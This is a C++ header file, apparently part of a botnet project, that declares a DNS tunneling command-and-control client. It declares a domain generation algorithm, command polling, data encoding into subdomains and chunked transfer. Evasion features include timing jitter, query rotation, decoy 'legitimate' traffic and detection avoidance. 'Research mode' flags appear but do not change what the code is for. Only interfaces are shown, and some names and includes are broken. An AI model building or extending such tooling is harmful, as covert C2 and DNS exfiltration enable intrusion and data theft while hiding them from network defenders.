#pragma once

#include <string>
#include <vector>
#include <map>
#include <memory>
#include <chrono>
#include <random>
#include <boost/asio.hpp>
#include "message.h"
#include "crypto/encryption.h"

namespace botnet {
namespace protocol {

/**
 * @brief Cross-platform DNS tunneling client
 * 
 * Single implementation using standard DNS protocols.
 * Works identically on Windows, Linux, and macOS using Boost.Asio.
 */
class DNSTunnelClient {
public:
    enum class QueryType {
        A = 1,      // IPv4 address
        AAAA = 28,  // IPv6 address  
        TXT = 16,   // Text record
        CNAME = 5,  // Canonical name
        MX = 15,    // Mail exchange
        NS = 2      // Name server
    };

    struct DNSQuery {
        std::string domain;
        QueryType type;
        std::vector<uint8_t> encoded_data;
        std::string query_id;
        std::chrono::system_clock::time_point timestamp;
    };

    struct DNSResponse {
        std::string query_id;
        bool success;
        std::vector<std::string> answers;
        std::vector<uint8_t> decoded_data;
        std::chrono::milliseconds response_time;
        std::string error_message;
    };

public:
    explicit DNSTunnelClient(boost::asio::io_context& io_context);
    ~DNSTunnelClient();

    // Configuration
    void SetDNSServers(const std::vector<std::string>& servers);
    void SetBaseDomain(const std::string& domain);
    void SetTimeout(std::chrono::seconds timeout);
    void SetMaxRetries(uint32_t max_retries);

    // Domain Generation Algorithm (DGA)
    void EnableDGA(bool enabled);
    void SetDGASeed(uint32_t seed);
    void SetDGAParameters(uint32_t domains_per_day, const std::vector<std::string>& tlds);
    std::vector<std::string> GenerateDGADomains(uint32_t count) const;

    // Core tunneling operations
    DNSResponse SendData(const std::vector<uint8_t>& data, QueryType type = QueryType::TXT);
    DNSResponse SendMessage(const Message& message, const crypto::AESEncryption& encryption);
    DNSResponse SendHeartbeat();
    DNSResponse SendCommand(const std::string& command, const std::map<std::string, std::string>& params);

    // Polling for commands
    bool StartPolling(std::chrono::seconds interval);
    void StopPolling();
    bool IsPolling() const;

    // Encoding methods
    std::string EncodeDataToSubdomain(const std::vector<uint8_t>& data, size_t max_length = 63) const;
    std::vector<uint8_t> DecodeDataFromAnswer(const std::string& answer) const;

    // Research mode
    void EnableResearchMode(bool enabled);
    void SetResearchLogging(bool enabled);
    std::vector<std::string> GetTunnelLog() const;

    // Statistics
    struct TunnelStats {
        uint32_t total_queries;
        uint32_t successful_queries;
        uint32_t failed_queries;
        uint64_t bytes_sent;
        uint64_t bytes_received;
        std::chrono::milliseconds average_response_time;
        uint32_t dga_domains_generated;
    };

    TunnelStats GetStats() const;
    void ResetStats();

private:
    using udp = boost::asio::ip::udp;

    boost::asio::io_context& io_context_;
    std::unique_ptr<udp::socket> socket_;
    udp::resolver resolver_;

    // Configuration
    std::vector<std::string> dns_servers_;
    std::string base_domain_;
    std::chrono::seconds timeout_{5};
    uint32_t max_retries_{3};

    // DGA configuration
    bool dga_enabled_{false};
    uint32_t dga_seed_{0};
    uint32_t domains_per_day_{1000};
    std::vector<std::string> dga_tlds_{".com", ".net", ".org"};

    // Polling
    bool polling_{false};
    std::unique_ptr<boost::asio::steady_timer> poll_timer_;
    std::chrono::seconds poll_interval_{60};

    // Research mode
    bool research_mode_{false};
    bool research_logging_{false};
    mutable std::vector<std::string> tunnel_log_;

    // Statistics
    mutable std::mutex stats_mutex_;
    TunnelStats stats_{};

    // Random number generation
    mutable std::mt19937 rng_;

    // Internal methods
    DNSResponse ExecuteQuery(const DNSQuery& query);
    std::vector<uint8_t> CreateDNSPacket(const DNSQuery& query) const;
    DNSResponse ParseDNSResponse(const std::vector<uint8_t>& response_data, 
                                const std::string& query_id) const;

    std::string GenerateDGADomain(uint32_t seed) const;
    std::string GetCurrentDNSServer() const;
    
    void HandlePollTimer(const boost::system::error_code& ec);
    void ScheduleNextPoll();

    void UpdateStats(bool success, std::chrono::milliseconds response_time, 
                    size_t bytes_sent, size_t bytes_received);
    void LogResearchActivity(const std::string& activity) const;
};

/**
 * @brief Base32 encoding for DNS-safe data transmission
 */
class Base32Encoder {
public:
    static std::string Encode(const std::vector<uint8_t>& data);
    static std::vector<uint8_t> Decode(const std::string& encoded);
    
    // DNS-safe encoding (no padding, lowercase)
    static std::string EncodeDNSSafe(const std::vector<uint8_t>& data);
    static std::vector<uint8_t> DecodeDNSSafe(const std::string& encoded);

private:
    static const char ALPHABET[];
    static const char DNS_ALPHABET[];
    static const std::map<char, uint8_t> DECODE_MAP;
    static const std::map<char, uint8_t> DNS_DECODE_MAP;
};

/**
 * @brief Domain chunking for large data transmission
 */
class DomainChunker {
public:
    struct Chunk {
        uint32_t chunk_id;
        uint32_t total_chunks;
        std::string session_id;
        std::vector<uint8_t> data;
        std::string encoded_domain;
    };

public:
    DomainChunker();
    
    std::vector<Chunk> ChunkData(const std::vector<uint8_t>& data, 
                                size_t max_chunk_size = 32) const;
    std::vector<uint8_t> ReassembleChunks(const std::vector<Chunk>& chunks) const;
    
    std::string CreateChunkedDomain(const Chunk& chunk, const std::string& base_domain) const;
    Chunk ParseChunkedDomain(const std::string& domain) const;
    
    void SetResearchMode(bool enabled);

private:
    bool research_mode_{false};
    
    std::string GenerateSessionId() const;
    uint32_t CalculateChecksum(const std::vector<uint8_t>& data) const;
};

/**
 * @brief DNS query obfuscation and evasion
 */
class DNSObfuscator {
public:
    DNSObfuscator();
    
    // Query timing obfuscation
    void AddTimingJitter(std::chrono::milliseconds base_delay = std::chrono::milliseconds(0)) const;
    std::chrono::milliseconds GetRandomInterval(std::chrono::seconds base_interval) const;
    
    // Query type rotation
    DNSTunnelClient::QueryType GetRandomQueryType() const;
    void SetAllowedQueryTypes(const std::vector<DNSTunnelClient::QueryType>& types);
    
    // Domain obfuscation
    std::string ObfuscateDomain(const std::string& domain) const;
    std::string AddRandomSubdomains(const std::string& domain, uint32_t count = 1) const;
    
    // Legitimate traffic mimicking
    void GenerateLegitimateTraffic(boost::asio::io_context& io_context, 
                                  std::chrono::seconds interval) const;
    
    void SetResearchMode(bool enabled);

private:
    mutable std::mt19937 rng_;
    std::vector<DNSTunnelClient::QueryType> allowed_types_;
    bool research_mode_{false};
    
    static const std::vector<std::string> RANDOM_WORDS;
    static const std::vector<std::string> LEGITIMATE_DOMAINS;
    
    std::string GetRandomWord() const;
    std::string GetLegitimateDomai() const;
};

/**
 * @brief DNS cache poisoning detection and evasion
 */
class DNSEvasion {
public:
    DNSEvasion();
    
    // Cache evasion techniques
    std::string AddCacheBuster(const std::string& domain) const;
    std::vector<std::string> RotateDNSServers(const std::vector<std::string>& servers) const;
    
    // Query dispersion
    void SetQueryDispersion(bool enabled);
    std::chrono::milliseconds GetDispersedDelay() const;
    
    // Detection avoidance
    bool ShouldAvoidQuery(const std::string& domain) const;
    void AddBlacklistedDomain(const std::string& domain);
    
    // Legitimate query injection
    void InjectLegitimateQueries(boost::asio::io_context& io_context, uint32_t count) const;

private:
    bool query_dispersion_{true};
    std::vector<std::string> blacklisted_domains_;
    mutable std::mt19937 rng_;
    
    static const std::vector<std::string> LEGITIMATE_QUERY_DOMAINS;
};

/**
 * @brief DNS message processor for command handling
 */
class DNSMessageProcessor {
public:
    using CommandCallback = std::function<void(const std::string&, const nlohmann::json&)>;

public:
    DNSMessageProcessor();
    
    void SetCommandCallback(CommandCallback callback);
    
    // Message processing
    void ProcessDNSResponse(const DNSTunnelClient::DNSResponse& response);
    std::string ExtractCommand(const std::vector<std::string>& txt_records) const;
    nlohmann::json ExtractParameters(const std::vector<std::string>& txt_records) const;
    
    // Response encoding
    std::string EncodeResponse(const std::string& command_id, 
                              const nlohmann::json& response_data) const;
    
    // Research mode
    void EnableResearchMode(bool enabled);
    std::vector<std::string> GetProcessingLog() const;

private:
    CommandCallback command_callback_;
    bool research_mode_{false};
    mutable std::vector<std::string> processing_log_;
    
    void LogResearchActivity(const std::string& activity) const;
    
    // Protocol parsing
    bool IsValidDNSCommand(const std::string& txt_record) const;
    std::map<std::string, std::string> ParseTXTRecord(const std::string& txt_record) const;
};

/**
 * @brief DNS tunnel session manager
 */
class DNSTunnelSession {
public:
    struct SessionInfo {
        std::string session_id;
        std::chrono::system_clock::time_point start_time;
        std::chrono::system_clock::time_point last_activity;
        uint32_t messages_sent;
        uint32_t messages_received;
        uint64_t bytes_transferred;
        bool active;
    };

public:
    DNSTunnelSession();
    
    // Session management
    std::string StartSession();
    void EndSession(const std::string& session_id);
    bool IsSessionActive(const std::string& session_id) const;
    
    // Session tracking
    void UpdateSessionActivity(const std::string& session_id);
    void RecordMessageSent(const std::string& session_id, size_t bytes);
    void RecordMessageReceived(const std::string& session_id, size_t bytes);
    
    // Session information
    SessionInfo GetSessionInfo(const std::string& session_id) const;
    std::vector<SessionInfo> GetAllSessions() const;
    
    // Cleanup
    void CleanupExpiredSessions(std::chrono::hours max_age = std::chrono::hours(24));

private:
    std::map<std::string, SessionInfo> sessions_;
    mutable std::mutex sessions_mutex_;
    
    std::string GenerateSessionId() const;
};

} // namespace protocol
} // namespace botnet
